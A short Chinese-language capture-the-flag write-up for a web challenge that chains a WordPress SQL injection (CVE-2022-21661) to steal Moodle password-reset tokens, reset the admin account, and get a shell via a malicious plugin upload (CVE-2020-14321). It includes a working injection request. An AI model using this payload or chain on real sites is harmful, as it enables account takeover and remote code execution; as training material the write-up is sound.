# easylogin

> 分类：Web

## 题目描述

渗透题。80 端口 WordPress，8888 端口 Moodle。利用 WordPress SQL 注入（CVE-2022-21661）读 Moodle 数据库的密码重置 token，重置 admin 密码，再通过 Moodle 插件上传 RCE（CVE-2020-14321）getshell。

## 考察知识点

- WordPress SQL 注入（CVE-2022-21661）
- Moodle 密码重置流程（`mdl_user_password_resets` token）
- Moodle 插件上传 RCE（CVE-2020-14321）

## 解法

1. 80 端口 wordpress 5.8.2 存在 CVE-2022-21661 SQL 注入，sqlmap 跑出 `wordpress` 和 `moodle` 库。
2. 用户密码均为 hash，不可破解，转而查询 `moodle.mdl_user_password_resets` 拿到重置 token：

```
POST /wp-admin/admin-ajax.php
action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,(SELECT group_concat(token) FROM moodle.mdl_user_password_resets)),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id
```

3. 访问 `http://47.104.251.7:8888/login/forgot_password.php?token=<token>&username=admin` 重置 admin 密码。
4. 登录 Moodle 后台，在 `/admin/tool/installaddon/index.php` 上传恶意插件压缩包（CVE-2020-14321），访问 shell 路径读取 `/etc/mytest/flaaaaaaaggggggggggggggggggggg`。

## 参考答案

（flag 通过 Moodle 插件 RCE 读取）

## 来源

- 作者：404Team | https://www.nynusec.com/archives/第六届强网杯-writeup
